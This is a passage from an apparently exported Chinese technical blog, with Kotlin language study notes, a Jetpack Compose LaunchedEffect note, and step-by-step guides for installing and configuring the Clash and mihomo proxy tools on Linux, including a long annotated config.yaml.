当你在其他的包内使用该类的扩展属性或方法时，需要将他的本类和他的扩展方法都导入
package foo.barfun Baz.goo() &#123; …… &#125; 
要使用所定义包之外的一个扩展, 通过import导入扩展的函数名进行使用:
package com.example.usageimport foo.bar.goo // 导入所有名为 goo 的扩展                   // 或者import foo.bar.*   // 从 foo.bar 导入一切fun usage(baz: Baz) &#123;    baz.goo()&#125;
扩展声明为成员在一个类内部你可以为另一个类声明扩展。
在这个扩展中，有个多个隐含的接受者，其中扩展方法定义所在类的实例称为分发接受者，而扩展方法的目标类型的实例称为扩展接受者。假如在调用某一个函数，而该函数在分发接受者和扩展接受者均存在，则以扩展接收者优先，要引用分发接收者的成员你可以使用限定的 this 语法。
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin（基本数据类型）</title>
    <url>/posts/7a5e1904/</url>
    <content><![CDATA[基本数据类型相比于java而言，kotlin不会区分基本数据类型和他们的包装类，都是统一的数据类型，但是他们的底层实现会和java相关。
java中Int，Boolean之类的基本数据类型都和引用类做了区分，基本数组存值，而包装类存储包含该对象的内存地址的引用。
kotlin中他不区分，都是用一个类Int，Boolean等。这样就很方便我们的操作。但是这并不意味着kotlin直接把所有的类都直接写出引用类型了。因为那样的话，就会非常低效。在运行时，数字类型尽可能的使用最高效的方式存储，大部分情况下—-对于变量，属性，参数和返回类型，kotlin的int类型都会编译为java中的基本数据类型。唯一不可行的就是泛型类，集合。他一定会编译为包装类。
可空数据类型 Int？，Boolean？这些可空数据类型因为不止能存储基础数据类型，还能存储null，所以肯定是包装类。

这是基于JVM虚拟机实现泛型的方式决定的，JVM不支持用基本数据类型作为类型参数，所以必须使用包装类。如果要高效的存储基础数据类型的话，要么使用第三方库（Trove4）等。要么用数组存储。

数字转化在kotlin中没有默认的小范围向大范围自动变化类型，他严格限制具体的数据类型，也提供了相关方法toLong(),toByte()等。为了避免冲突，kotlin中的转化要求必须是显式的。即便是equals方法，2和2L也是不一样的。会返回false
Any，Any?kotlin中Any就和java中的object一样层级，属于所有类的父类。但是他只是非空类，Any?才包括所有的类。kotlin中使用Any会在字节码中编译为Object
Unit尽管他与java中的void有着一样的功能，但是它不一样，Unit是一个完备的类型，可以作为类型参数。但是void不行。而且全局只存在一个Unit类型，这个值也叫Unit，并且在函数中会被隐式的返回，即一个隐藏的return Unit时不需写出来的。Unit他只有一个实例。也是kotlin的一个特色，相比于java中，要么void，不然一定要添加return返回某个数据。
Nothing类型，这个函数一定不返回fun fail(message:String):Nothing&#123;    throw IllegalArgumentException(message)&#125;
Nothing类型，没有任何值，只有被当作函数返回值或者泛型函数返回值时才有意义。他同样的也可以搭配Evls运算符做判断。
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin标准方法with,run,apply AND 静态方法</title>
    <url>/posts/d9fc97ad/</url>
    <content><![CDATA[标准函数with,run,applyfun main() &#123;    //常用写法    val list = listOf(&quot;apple&quot;, &quot;banana&quot;, &quot;orange&quot;, &quot;pear&quot;, &quot;grape&quot;)    val builder = StringBuilder()    builder.append(&quot;Start eat fruits\n&quot;)    for (fruit in list) &#123;        builder.append(fruit + &quot;\n&quot;)    &#125;    builder.append(&quot;Ate all fruits\n&quot;)    println(builder)    //使用with作为标准函数来写    //with函数接受两个参数，第一个是任意类型的对象，第二个参数是一个lambda表达式。    //with函数会为lambda表达式中提供第一个对象的上下文    //并使用lambda表达式的最后一行代码作为返回值返回    var result = with(StringBuilder())&#123;        append(&quot;Start eat fruits\n&quot;)        for (fruit in list) &#123;            append(fruit + &quot;\n&quot;)        &#125;        append(&quot;Ate all fruits\n&quot;)        toString()    &#125;    println(result)    //run函数    //他不能直接调用，而必须调用某个对象的run方法才行，其次run函数只接受一个lambda函数。同样的他会把最后一行表达式作为返回值。    //他与with也是很类似的，只是使用场景不太一样。    result =StringBuilder().run&#123;        append(&quot;Start eat fruits\n&quot;)        for (fruit in list) &#123;            append(fruit + &quot;\n&quot;)        &#125;        append(&quot;Ate all fruits\n&quot;)        toString()    &#125;    println(result)		    //apply函数也是与run函数极其类似，同样是需要对象调用，而且只能传入一个lambda表达式，只是他最后不用返回结果，而是自动返回调用对象本身&#125;

静态方法在kotlin中，并没有绝对定义的静态函数，你可以通过定义一个单例，然后调用其中的方法。或者任意一个类通过增加他的伴生类的方法。都可以做到类似静态函数的调用方法，不用再创建实例而是直接使用。但这根本上并不是静态方法。如果真正的需要静态方法，可以有两种解决办法：1.注解 2.顶层方法。

注解在单例类或者伴生类中的方法上添加@JvmStatic的方法。这样在jvm编译时，会把他们编译为静态方法。
顶层方法他会直接编译为静态方法，详见：kotlin顶层方法

]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin语言基础与跨平台性</title>
    <url>/posts/62dcc9a3/</url>
    <content><![CDATA[
视频学习

Kotlin学习JVM虚拟机  kotlin语言在进行编译的环节中，会比java更加的优化
跨平台性不止可以基于JVM运行，甚至可以直接生成二进制代码。

基础语法语言声明变量和内置数据类型  声明变量：
println(&quot;hello world&quot;)   /*       var 变量名 : 数据类型 = &quot;&quot;    */   var str:String = &quot;hzt&quot;   /*       内置数据类型       String  字符串       Char    字符       Boolean true/false       Int     整形       Float   单精度浮点型       Double  双精度浮点型       List    集合       Set     无重复集合       Map     键值对集合    */   println(str)   //他没有int，float。因为他在运行时，会转化为java中的类然后使用。
只读变量val声明的变量只读，不可修改，类比于final。var声明的变量可读可改。
类型推断不需要显示的表明数据类型，他会根据你给的数据进行推断
var s1 = &quot;hzt&quot;var s2 : String = &quot;hzt&quot;
编译时常量const val 和val不是一个概念
const val PI = 3.1415 //他只能定义在函数之外，他会在编译时便会初始化，不可以定义在函数内。
查看kotlin反编译后字节码
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin集合操作符详解</title>
    <url>/posts/112f98ad/</url>
    <content><![CDATA[继续学习
集合操作符在kotlin中，关于集合的操作符分为6种，分别是：总数擦欧总夫，过滤操作符，映射操作符，顺序操作符，生产操作符和元素操作符。
总数操作符太多内容，不一一列举，使用时可以再上网察看
val a = listOf(1, &quot;2&quot;, 43, true)    println(a.any())//true    println(a.any &#123; it is Number &#125;)//true    println(a.all &#123; it is Int &#125;)//false    println(a.count())//4    println(a.count &#123; it is Number &#125;)//2    a.forEach &#123; println(it) &#125;
过滤操作符drop()：从第一项开始去除前n个元素，并返回剩余的元素列表。dropWhile{}：根据给定函数从第一项开始去掉指定元素，直到不满足条件为止的前面的元素，并返回剩余元素列表。dropLastWhile{}：根据给定函数从最后一项开始去掉指定元素，直到不满足条件为止的后面的元素，并返回剩余元素的列表。filter{}：过滤出所有符合给定函数条件的元素。filterNot{}：过滤所有不符合给定函数条件的元素。filterNotNull()：过滤所有元素中不是null的元素。slice()：过滤一个list中指定index的元素。take()：返回从第一个开始的n个元素。takeLast()：返回从最后一个开始的n个元素。takeWhile{}：返回从第一个开始符合给定函数条件的元素，直到不符合条件为止。takeLastWhile{}:返回从最后一个开始符合给定函数条件的元素，直到不符合条件为止。
映射操作符map{}：将集合的每个元素映射成其他类型，组装成新的集合。新的集合长度和原有的长度一样mapIndexed{}：为每一个索引设置新的元素，组装成新的集合mapNotNull{} : mapNotNull和map的效果一样，只是mapNotNull过滤掉为null的元素flatMap：可以合并集合并做一些小动作
val a = listOf(1, &quot;2&quot;, 43, true)    val b = listOf(3,4,5)    var c = listOf(a,b).flatMap &#123; it -&gt; it &#125;    println(c)
groupBy{}将集合中的元素按某个条件进行分组，返回map
val a = listOf(1, 42,5,14,421)    println(a.groupBy &#123; if(it&lt;10)&quot;small&quot; else &quot;big&quot; &#125;)    //&#123;small=[1, 5], big=[42, 14, 421]&#125;
顺序生产元素不细讲，使用时再学
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Linux 部署 Clash 代理服务</title>
    <url>/posts/b32510c2/</url>
    <content><![CDATA[linux部署代理服务 这次演示使用clash+dashboard作为代理服务并配合机场使用安装  先在用户目录下安装一个clash文件夹，并进入到其中mkdir clash &amp;&amp; cd clash  然后再目录下，把机场给的config.yaml下载下来，可以使用wgetwget &quot;机场给你的订阅链接&quot; -O config.yaml然后从github上获取clash和dashboard的二进制文件。wget https://github.com/Dreamacro/clash/releases/download/v1.11.12/clash-linux-amd64-v1.11.12.gzwget https://github.com/haishanh/yacd/releases/download/v0.3.7/yacd.tar.xz如果你的服务器的网络不好，可以通过这个链接下载内容（这里已经完成了解压步骤）。然后上传到服务器即可你可以从以下链接获取clash和dashboard的与你服务器适配的版本。clashdashboard然后解压两个文件gzip -d clash-linux-amd64-v1.11.12.gztar -xvf yacd.tar.xz &amp;&amp; mv public dashboard给clash添加执行权限chmod +x clash编辑config.yaml配置port: 7890socks-port: 7891allow-lan: truemode: Rulelog-level: infosecert: 123456 // 增加这一行, 如果你希望你的clashweb要密码访问可以在这块配置密码, 如果不需要直接注释掉即可external-ui: dashboard // 增加这一行external-controller: 0.0.0.0:9090然后执行./clash -d .即可运行起来。然后配置代理服务。

如果只是暂时使用export https_proxy=http://127.0.0.1:7890           export http_proxy=http://127.0.0.1:7890   export all_proxy=socks5://127.0.0.1:7891
也可以配置到~.&#x2F;bashrc中  然后source .&#x2F;bashrc需要关闭代理可以unset http_proxyunset https_proxyunset all_proxy
参考以下博客内容
https://parrotsec-cn.org/t/linux-clash-dashboard/5169



]]></content>
      <categories>
        <category>clash</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 四个目录命令用途和区别</title>
    <url>/posts/14b1606d/</url>
    <content><![CDATA[Linux下 &#x2F;bin、&#x2F;sbin、&#x2F;usr&#x2F;sbin、&#x2F;usr&#x2F;bin 目录的作用和区别首先区别&#x2F;sbin,&#x2F;bin&#x2F;sbin 下的命令属于基本的系统命令，如shutdown，reboot，用于启动系统，修复系统
&#x2F;bin下存放一些普通的基本命令，如ls,chmod等，这些命令在Linux系统里的配置文件脚本里经常用到
无论是&#x2F;bin、&#x2F;sbin、&#x2F;usr&#x2F;sbin、&#x2F;usr&#x2F;bin他们都是全局可以执行的命令
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Kotlin（类，class）</title>
    <url>/posts/4b04046c/</url>
    <content><![CDATA[初始化类
class User (_nickname:String)&#123;	val nickname:String	init&#123;		nickname = _nickname	&#125;&#125;
以上就是一个kotlin类的初始化，他的主构造函数直接写在User类后面，还省略了关键字constructor。但是由于语法结构的问题，他没有函数体，所有就通过init与主构造方法一起使用。在类中的元素必须初始化，可以如上图所示，也可以直接赋值。val nickname:String = _nickname
kotlin还可以化简操作，直接把属性声明在主构造函数中class User(val nickName;String)
如上，这个是最简形式

构造方法kotlin中也可以有很多的从构造方法。而且他们用的不是继承，而是另一个关键词，委托，通过委托，委托其他的构造方法来帮助自己实现构造，他的写法与继承一样，用:来链接。他可以像java一样写很多的从构造方法，然后可以相互委托，但最后必须也委托给初始化基类，或者另一个这样做了的从构造方法。初始化基类的构造方法：主构造方法（包括父类的主构造方法）。
接口中的属性在kotlin中，接口可以实现具体的方法，但是他不能有初始化的属性，也就是不能有字段，他的属性只能声明，不能赋值。
interface A&#123;	val name:String&#125;
实现这个接口的类一定要用override重写这个方法，可以赋值也可以定义get方法。或者定义初始化方法如果接口中定义了属性的get方法，那么这个属性也可以直接继承，而不用重写

get方法和set方法，还有构造器方法都可以私有化，也就是可以实现一些单例或者静态方法之类的，保证封闭性。

]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>LaunchedEffect：在Jetpack Compose中使用协程</title>
    <url>/posts/1fa68cf/</url>
    <content><![CDATA[LaunchEffect允许我们在Composable中使用协程
@Composable fun DisposableEffect(    vararg keys: Any?,    effect: DisposableEffectScope.() -&gt; DisposableEffectResult): Unit

像DisposableEffect一样，当Composable进入composition时执行block
当Composable从树上detach时，CoroutineScope执行cancel
参数keys发生变化是，会执行cancel后再次执行effect简而言之，就是支持执行Coroutine的DisposableEffect，会自动执行cancel，不需要手动onDispose

]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>compose</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux配置mihomo代理并开启TUN模式</title>
    <url>/posts/70b7a805/</url>
    <content><![CDATA[先介绍一下什么是mihomo:

Mihomo原名Clash Meta，是基于广受欢迎的开源网络代理工具Clash开发的增强网络代理工具。它不仅继承了Clash的核心功能，还增加了一些独特的特性，如支持更多的出站传输协议和复杂的规则控制等。在2023年经历了Clash for Windows删库事件之后，原Clash项目删库停止更新，于是开发者将Clash Meta改名为Mihomo，继续进行维护和更新。

所以，曾经使用过clash的应该可以很快上手。
mihomo官网
在本篇文章中，将会使用mihomo内核来进行代理，同时还会打开TUN模式实现透明代理。如有需要请接着往下看吧。
mihomo安装和配置下载mihomo内核
进入mihomo内核下载地址去下载对应架构版本的文件。比如mihomo-linux-amd64-alpha-b3db113.gz，解压后将mihomo-linux-amd64上传到虚拟机上，同时重命名为mihomo。

如果访问不到github的话，这里提供一个mihomo-linux-amd64-go120-v1.19.1.gz


给 mihomo 增加执行权限：
sudo chmod +x mihomo

将mihomo移动到/usr/local/bin/目录
 sudo cp mihomo /usr/local/bin

创建运行目录
 sudo mkdir /etc/mihomo -p

配置运行环境将下面的一键压缩包解压到/etc/mihomo的目录下
wget https://olist.zfxt.top/d/%E5%85%B1%E4%BA%AB/%E8%81%94%E9%80%9A%E4%BA%91%E7%9B%98/mihomo/mihomo.tar.gz?sign=LGZDXEBN7jEsC2UFAqEIAA-0yFgMk_vZuPS-E9ZZfJg=:0 -O mihomo.tar.gztar -zxvf mihomo.tar.gz

一键压缩包
我提供的压缩包中含有的内容，包括几个常用的数据库和MetaCubeXd外部UI。你只需要详细阅读config.yaml(里面已经有很丰富的注释)。

UI展示
config.yaml的具体说明如下，在此特别鸣谢 煎饼果子卷鲨鱼辣椒  这里贴上大佬原文
# ClashMeta 高级优化配置# 最后更新：2024-10-28# 作者：🥞煎饼果子卷鲨鱼辣椒🌶️#------------------------基础配置------------------------#mixed-port: 7890            # 混合端口：HTTP(S)和SOCKS5共用端口geodata-mode: true          # GEO模式：true使用geoip.dat数据库,false使用mmdb数据库tcp-concurrent: true        # TCP并发：允许并发连接TCP,提高并发性能unified-delay: true         # 统一延迟：统一显示节点延迟allow-lan: true            # 局域网连接：允许其他设备经过本机代理bind-address: &quot;*&quot;          # 监听地址：*表示绑定所有IP地址find-process-mode: strict  # 进程匹配模式：strict严格,off关闭,always总是ipv6: false               # IPv6开关：是否启用IPv6支持# 运行模式(任选其一):# rule: 规则模式 - 根据规则匹配来选择代理# global: 全局模式 - 全部流量走代理# direct: 直连模式 - 全部流量不走代理mode: rule# 日志等级(按详细程度排序):# debug: 调试# info: 信息# warning: 警告# error: 错误# silent: 静默log-level: info# 外部控制设置external-controller: 0.0.0.0:9090  # 外部控制器监听地址external-ui: /etc/mihomo/ui               # 外部控制器UI目录secret: &quot;&quot;                        # 外部控制器密码#------------------------性能调优------------------------#tcp-concurrent-users: 64      # TCP并发连接数,根据服务器性能调整,建议值:16-128keep-alive-interval: 15       # 保活心跳间隔(秒),建议值:15-30inbound-tfo: true            # 入站TCP Fast Openoutbound-tfo: true           # 出站TCP Fast Open# Windows示例#interface-name: WLAN   # Windows中的无线网卡名称# 或#interface-name: 以太网  # Windows中的有线网卡名称# macOS示例#interface-name: en0    # macOS中通常是Wi-Fi# 或#interface-name: en1    # macOS中通常是有线网卡# Linux示例#interface-name: eth0   # Linux中常见的有线网卡名# 或#interface-name: wlan0  # Linux中常见的无线网卡名# 连接池配置connection-pool-size: 256     # 连接池大小,建议值:128-512idle-timeout: 60             # 空闲超时时间(秒)#------------------------TLS 配置------------------------#tls:  enable: true               # 启用TLS支持  skip-cert-verify: false    # 是否跳过证书验证  alpn:                      # 应用层协议协商    - h2                     # HTTP/2    - http/1.1              # HTTP/1.1  min-version: &quot;1.2&quot;        # 最低TLS版本  max-version: &quot;1.3&quot;        # 最高TLS版本  cipher-suites:            # 加密套件优先级    - TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256    - TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256    - TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305    - TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305#------------------------TUN 配置------------------------#tun:  enable: true  stack: system  auto-route: true  auto-detect-interface: true  dns-hijack:    - any:53    - tcp://any:53#------------------------DNS 配置------------------------#dns:  enable: true              # 启用DNS服务器  prefer-h3: true          # 优先使用HTTP/3查询  ipv6: false              # DNS解析IPv6  listen: 0.0.0.0:53       # DNS监听地址  enhanced-mode: redir-host   # DNS模式: fake-ip或redir-host  use-hosts: true          # 使用hosts文件  # 默认DNS服务器(用于解析其他DNS服务器的域名)  default-nameserver:    - 223.5.5.5            # 阿里DNS    - 119.29.29.29         # 腾讯DNS  # DNS服务器分流策略  nameserver-policy:    &#x27;www.google.com&#x27;: &#x27;https://dns.google/dns-query&#x27;      # Google域名使用Google DNS    &#x27;www.facebook.com&#x27;: &#x27;https://dns.google/dns-query&#x27;    # Facebook域名使用Google DNS    &#x27;.cn&#x27;: &#x27;https://doh.pub/dns-query&#x27;                    # 中国域名使用国内DNS  # Fake-IP配置  fake-ip-range: 198.18.0.1/16    # Fake-IP地址段  fake-ip-filter:                 # Fake-IP过滤清单    - &quot;*.lan&quot;                     # 本地域名    - &quot;localhost.ptlogin2.qq.com&quot; # QQ登录  # 主要DNS服务器  nameserver:    # 国内DNS服务器    - https://doh.pub/dns-query#h3=true                # DNSPod DOH    - https://dns.alidns.com/dns-query#h3=true         # 阿里 DOH    - tls://223.5.5.5:853                              # 阿里 DOT    # 国外DNS服务器    - https://dns.google/dns-query#h3=true             # Google DOH    - https://cloudflare-dns.com/dns-query#h3=true     # Cloudflare DOH    - quic://dns.adguard.com:784                       # AdGuard DOQ  # 备用DNS服务器(用于解析国外域名)  fallback:    - https://dns.google/dns-query#h3=true    - https://1.1.1.1/dns-query#h3=true    - tls://8.8.8.8:853# 代理提供商配置proxy-providers:  订阅1:    type: http    url: &quot;&quot;    interval: 21600    path: ./proxy_providers/sub1.yaml    health-check:      enable: true      url: http://www.google.com/generate_204      interval: 1800  订阅2:    type: http    url: &quot;&quot;    interval: 21600    path: ./proxy_providers/sub2.yaml    health-check:      enable: true      url: http://www.google.com/generate_204      interval: 1800#代理分组#  include-all-providers: true 自动引入【proxy-providers】所有代理集合，顺序将按照名称排序proxy-groups:  #------------------------基础分组------------------------#  - name: 🚀 节点选择    type: select    proxies:      - ♻️ 自动选择      - 🔯 故障转移      - 🔮 负载均衡      - 🇭🇰 香港节点      - 🇲🇴 澳门节点      - 🇨🇳 台湾节点      - 🇯🇵 日本节点      - 🇰🇷 韩国节点      - 🇺🇲 美国节点      - 🇬🇧 英国节点      - 🇩🇪 德国节点      - 🇫🇷 法国节点      - 🇮🇳 印度节点      - 🇸🇬 狮城节点      - 🇮🇩 印尼节点      - 🇻🇳 越南节点      - 🇹🇭 泰国节点      - 🇦🇺 澳洲节点      - 🇧🇷 巴西节点      - 🌍 其他节点      - DIRECT  - name: ♻️ 自动选择    type: url-test    include-all-providers: true    url: http://www.gstatic.com/generate_204    interval: 300    tolerance: 100            # 调整延迟容差为100ms  - name: 🔯 故障转移    type: fallback    include-all-providers: true    url: http://www.gstatic.com/generate_204    interval: 300  - name: 🔮 负载均衡    type: load-balance    strategy: consistent-hashing    include-all-providers: true    url: http://www.gstatic.com/generate_204    interval: 300  #------------------------地区分组------------------------#  - name: 🇭🇰 香港节点    type: url-test    include-all-providers: true    filter: &quot;(?i)港|hk|hongkong|hong kong&quot;    url: http://www.gstatic.com/generate_204    interval: 300    tolerance: 100  - name: 🇲🇴 澳门节点    type: url-test    include-all-providers: true    filter: &quot;(?i)澳门|门|mo|macao&quot;    url: http://www.gstatic.com/generate_204    interval: 300    tolerance: 100  - name: 🇨🇳 台湾节点    type: url-test    include-all-providers: true    filter: &quot;(?i)台|tw|taiwan|taipei&quot;    url: http://www.gstatic.com/generate_204    interval: 300    tolerance: 100  - name: 🇯🇵 日本节点    type: url-test    include-all-providers: true    filter: &quot;(?i)日本|jp|japan|tokyo|osaka&quot;    url: http://www.gstatic.com/generate_204    interval: 300    tolerance: 100  - name: 🇰🇷 韩国节点    type: url-test    include-all-providers: true    filter: &quot;(?i)韩|kr|korea|seoul&quot;    url: http://www.gstatic.com/generate_204    interval: 300    tolerance: 100  - name: 🇺🇲 美国节点    type: url-test    include-all-providers: true    filter: &quot;(?i)美|us|united states|america|los angeles|san jose|silicon valley&quot;    url: http://www.gstatic.com/generate_204    interval: 300    tolerance: 100  - name: 🇬🇧 英国节点    type: url-test    include-all-providers: true    filter: &quot;(?i)英|uk|united kingdom|london&quot;    url: http://www.gstatic.com/generate_204    interval: 300    tolerance: 100  - name: 🇩🇪 德国节点    type: url-test    include-all-providers: true    filter: &quot;(?i)德|de|germany|frankfurt&quot;    url: http://www.gstatic.com/generate_204    interval: 300    tolerance: 100  - name: 🇫🇷 法国节点    type: url-test    include-all-providers: true    filter: &quot;(?i)法|fr|france|paris&quot;    url: http://www.gstatic.com/generate_204    interval: 300    tolerance: 100  - name: 🇮🇳 印度节点    type: url-test    include-all-providers: true    filter: &quot;(?i)印度|in|india|mumbai&quot;    url: http://www.gstatic.com/generate_204    interval: 300    tolerance: 100  - name: 🇸🇬 狮城节点    type: url-test    include-all-providers: true    filter: &quot;(?i)新|sg|singapore&quot;    url: http://www.gstatic.com/generate_204    interval: 300    tolerance: 100  - name: 🇮🇩 印尼节点    type: url-test    include-all-providers: true    filter: &quot;(?i)印尼|印度尼西亚|id|indonesia|jakarta&quot;    url: http://www.gstatic.com/generate_204    interval: 300    tolerance: 100  - name: 🇻🇳 越南节点    type: url-test    include-all-providers: true    filter: &quot;(?i)越南|vn|vietnam&quot;    url: http://www.gstatic.com/generate_204    interval: 300    tolerance: 100  - name: 🇹🇭 泰国节点    type: url-test    include-all-providers: true    filter: &quot;(?i)泰国|th|thailand|bangkok&quot;    url: http://www.gstatic.com/generate_204    interval: 300    tolerance: 100  - name: 🇦🇺 澳洲节点    type: url-test    include-all-providers: true    filter: &quot;(?i)澳大利亚|au|australia|sydney&quot;    url: http://www.gstatic.com/generate_204    interval: 300    tolerance: 100  - name: 🇧🇷 巴西节点    type: url-test    include-all-providers: true    filter: &quot;(?i)巴西|br|brazil&quot;    url: http://www.gstatic.com/generate_204    interval: 300    tolerance: 100  - name: 🌍 其他节点    type: url-test    include-all-providers: true    filter: &quot;(?i)^(?!.*(香港|台湾|日本|韩国|新加坡|美国|英国|德国|法国|印度|泰国|越南|印尼|澳大利亚|巴西|港|台|日|韩|新|美|英|德|法|印|泰|越|尼|澳|巴|hk|tw|jp|kr|sg|us|uk|de|fr|in|th|vn|id|au|br)).*&quot;    url: http://www.gstatic.com/generate_204    interval: 300    tolerance: 100  #------------------------场景分组------------------------#  - name: 🎬 国外媒体    type: select    proxies:      - 🚀 节点选择      - 🇭🇰 香港节点      - 🇨🇳 台湾节点      - 🇯🇵 日本节点      - 🇺🇲 美国节点      - 🇸🇬 狮城节点  - name: 🎮 游戏平台    type: select    proxies:      - 🚀 节点选择      - 🔯 故障转移      - 🇭🇰 香港节点      - 🇯🇵 日本节点      - 🇺🇲 美国节点      - 🇸🇬 狮城节点      - DIRECT  - name: 📱 即时通讯    type: select    proxies:      - 🚀 节点选择      - 🔯 故障转移      - 🇭🇰 香港节点      - 🇯🇵 日本节点      - 🇺🇲 美国节点      - 🇸🇬 狮城节点  - name: 🤖 AI平台    type: select    proxies:      - 🇯🇵 日本节点      - 🇺🇲 美国节点      - 🇸🇬 狮城节点      - 🇰🇷 韩国节点      - 🚀 节点选择      - 🔯 故障转移  - name: 🔧 GitHub    type: select    proxies:      - 🚀 节点选择      - 🔯 故障转移      - 🇭🇰 香港节点      - 🇨🇳 台湾节点      - 🇯🇵 日本节点      - 🇺🇲 美国节点      - 🇸🇬 狮城节点      - DIRECT  - name: Ⓜ️ 微软服务    type: select    proxies:      - 🚀 节点选择      - 🇭🇰 香港节点      - 🇨🇳 台湾节点      - 🇯🇵 日本节点      - 🇺🇲 美国节点      - 🇸🇬 狮城节点      - DIRECT  - name: 🍎 苹果服务    type: select    proxies:      - 🚀 节点选择      - 🇭🇰 香港节点      - 🇨🇳 台湾节点      - 🇯🇵 日本节点      - 🇺🇲 美国节点      - 🇸🇬 狮城节点      - DIRECT  #------------------------特殊分组------------------------#  - name: 🎯 全球直连    type: select    proxies:      - DIRECT      - 🚀 节点选择  - name: 🛑 广告拦截    type: select    proxies:      - REJECT      - DIRECT  - name: 🍃 应用净化    type: select    proxies:      - REJECT      - DIRECT  - name: 🆎 AdBlock    type: select    proxies:      - REJECT      - DIRECT  - name: 🛡️ 隐私防护    type: select    proxies:      - REJECT      - DIRECT  - name: 🐟 漏网之鱼    type: select    proxies:      - 🚀 节点选择      - 🎯 全球直连      - ♻️ 自动选择      - 🔯 故障转移# 规则提供商配置 - 优化版rule-providers:  # 广告规则  reject:    type: http    behavior: domain    url: &quot;https://cdn.jsdelivr.net/gh/Loyalsoldier/clash-rules@release/reject.txt&quot;    path: ./ruleset/reject.yaml    interval: 86400  # 隐私规则  privacy:    type: http    behavior: domain    url: &quot;https://cdn.jsdelivr.net/gh/blackmatrix7/ios_rule_script/rule/Clash/Privacy/Privacy.yaml&quot;    path: ./ruleset/privacy.yaml    interval: 86400  # 广告扩展规则  reject-extra:    type: http    behavior: domain    url: &quot;https://cdn.jsdelivr.net/gh/blackmatrix7/ios_rule_script/rule/Clash/AdvertisingLite/AdvertisingLite.yaml&quot;    path: ./ruleset/reject-extra.yaml    interval: 86400  # AI平台规则  ai-platforms:    type: http    behavior: classical    url: &quot;https://cdn.jsdelivr.net/gh/blackmatrix7/ios_rule_script/rule/Clash/OpenAI/OpenAI.yaml&quot;    path: ./ruleset/ai-platforms.yaml    interval: 86400  # 流媒体规则  streaming:    type: http    behavior: classical    url: &quot;https://cdn.jsdelivr.net/gh/blackmatrix7/ios_rule_script/rule/Clash/GlobalMedia/GlobalMedia.yaml&quot;    path: ./ruleset/streaming.yaml    interval: 86400  # 社交通讯规则  social:    type: http    behavior: classical    url: &quot;https://cdn.jsdelivr.net/gh/blackmatrix7/ios_rule_script/rule/Clash/Telegram/Telegram.yaml&quot;    path: ./ruleset/social.yaml    interval: 86400  # 微软服务规则  microsoft:    type: http    behavior: classical    url: &quot;https://cdn.jsdelivr.net/gh/blackmatrix7/ios_rule_script/rule/Clash/Microsoft/Microsoft.yaml&quot;    path: ./ruleset/microsoft.yaml    interval: 86400  # 苹果服务规则  apple:    type: http    behavior: classical    url: &quot;https://cdn.jsdelivr.net/gh/blackmatrix7/ios_rule_script/rule/Clash/Apple/Apple.yaml&quot;    path: ./ruleset/apple.yaml    interval: 86400  # 游戏平台规则  games:    type: http    behavior: classical    url: &quot;https://cdn.jsdelivr.net/gh/blackmatrix7/ios_rule_script/rule/Clash/Game/Game.yaml&quot;    path: ./ruleset/games.yaml    interval: 86400  # 开发平台规则  dev-platforms:    type: http    behavior: classical    url: &quot;https://cdn.jsdelivr.net/gh/blackmatrix7/ios_rule_script/rule/Clash/GitHub/GitHub.yaml&quot;    path: ./ruleset/dev-platforms.yaml    interval: 86400# 规则配置 - 优化版rules:  # 优先处理  - RULE-SET,reject,🛑 广告拦截,no-resolve  - RULE-SET,privacy,🛡️ 隐私防护,no-resolve  - RULE-SET,reject-extra,🆎 AdBlock,no-resolve  # 本地局域网  - DOMAIN-SUFFIX,local,DIRECT  - DOMAIN-SUFFIX,localhost,DIRECT  - IP-CIDR,127.0.0.0/8,DIRECT  - IP-CIDR,172.16.0.0/12,DIRECT  - IP-CIDR,192.168.0.0/16,DIRECT  - IP-CIDR,10.0.0.0/8,DIRECT  - IP-CIDR,17.0.0.0/8,DIRECT  - IP-CIDR,100.64.0.0/10,DIRECT  - IP-CIDR,224.0.0.0/4,DIRECT  - IP-CIDR6,fe80::/10,DIRECT  # 应用分流  - RULE-SET,ai-platforms,🤖 AI平台,no-resolve  - RULE-SET,streaming,🎬 国外媒体,no-resolve  - RULE-SET,social,📱 即时通讯,no-resolve  - RULE-SET,microsoft,Ⓜ️ 微软服务,no-resolve  - RULE-SET,apple,🍎 苹果服务,no-resolve  - RULE-SET,games,🎮 游戏平台,no-resolve  - RULE-SET,dev-platforms,🔧 GitHub,no-resolve  # 自定义规则  - PROCESS-NAME,clash,DIRECT  - PROCESS-NAME,v2ray,DIRECT  - PROCESS-NAME,xray,DIRECT  - PROCESS-NAME,naive,DIRECT  - PROCESS-NAME,trojan,DIRECT  - PROCESS-NAME,trojan-go,DIRECT  - PROCESS-NAME,ss-local,DIRECT  - PROCESS-NAME,privoxy,DIRECT  - PROCESS-NAME,leaf,DIRECT  - PROCESS-NAME,Thunder,DIRECT  - PROCESS-NAME,DownloadService,DIRECT  - PROCESS-NAME,qBittorrent,DIRECT  - PROCESS-NAME,Transmission,DIRECT  - PROCESS-NAME,fdm,DIRECT  - PROCESS-NAME,aria2c,DIRECT  - PROCESS-NAME,Folx,DIRECT  - PROCESS-NAME,NetTransport,DIRECT  - PROCESS-NAME,uTorrent,DIRECT  - PROCESS-NAME,WebTorrent,DIRECT  # 地域规则  - GEOIP,LAN,DIRECT,no-resolve  - GEOIP,CN,DIRECT,no-resolve  # 兜底规则  - MATCH,🚀 节点选择

在上面的配置文件中，一般只需要查看代理提供商配置这部分的内容，并添加上机场给你的配置文件即可。
将mihomo注册为service
